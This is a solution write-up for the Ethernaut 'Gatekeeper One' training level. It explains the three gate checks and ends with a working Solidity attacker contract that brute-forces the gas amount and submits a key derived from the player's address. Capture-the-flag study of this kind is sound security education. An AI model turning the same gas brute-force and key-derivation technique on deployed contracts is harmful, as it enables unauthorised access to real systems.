# Ethernaut - Gatekeeper One - Solution

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## Solution

The goal of this level is to register yourself as an `entrant`.

To pass `gateOne()`, we need to call `enter()` from a contract rather than from our EOA.

To pass `gateTwo()`, we need to forward a very specific amount of gas during the call to `enter()` such that the `gasleft()` when entering `gateTwo()` is a multiple of 8191.
While we could reverse-engineer this gas amount using, e.g., the Remix debugger, it's easier to simply bruteforce our way in, forwarding a different amount of gas with each try.

To pass `gateThree()`, let's take a closer look at the three `require` statements, starting with part 3:
Suppose our player address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.
Using chisel, we can then see that the right-hand side of part 3 evaluates to:
```
➜ address player = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
➜ uint16(uint160(player))
Type: uint16
├ Hex: 0xddc4
├ Hex (full word): 0x000000000000000000000000000000000000000000000000000000000000ddc4
└ Decimal: 56772
 ```

 Part 3 requires this to be equal to the full word of `uint32(uint64(_gateKey))`.
 In other words, the last 4 bytes of our `_gateKey` should be 0000ddc4.

 Part 2 tells us that at least one character of the first 4 bytes of our `_gateKey` must not be zero.
 See, for example:

```
➜ bytes8 key = 0x5931b4ed56ace4c4;
➜ uint64(key)
Type: uint64
├ Hex: 0x5931b4ed56ace4c4
├ Hex (full word): 0x0000000000000000000000000000000000000000000000005931b4ed56ace4c4
└ Decimal: 6427117074688828612
➜ uint32(uint64(key))
Type: uint32
├ Hex: 0x56ace4c4
├ Hex (full word): 0x0000000000000000000000000000000000000000000000000000000056ace4c4
└ Decimal: 1454171332
```

Finally, part 1 tells us that the last 4 bytes must be of the form 0000xxxx, where "xxxx" can be two arbitrary bytes. 
Notice that this is a similar requirement to part 3, but is actually less restrictive, since part 3 constraints those last two bytes to be exactly the last two bytes of our player's account address.
In that sense, the level's contraints would stay exactly the same, even if part 1 were deleted.

As a conclusion, one possible `_gateKey` is 0x1234abcd0000ddc4, assuming that our player address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.

With this information, we can solve the challenge using the following attacker:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttacker {
    address public immutable VICTIM;

    constructor(address victim) {
        VICTIM = victim;
    }

    function attack(bytes8 gateKey) external {
        for (uint256 i; i < 8191; i++) {
            (bool success, ) = VICTIM.call{gas: i + 5 * 8191}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                break;
            }
        }
    }
}
```

In the above contract, notice that we added a sufficiently high multiple of 8191 to our forwarded amount of gas so that we ensure that there's sufficient gas to execute the entire function call.
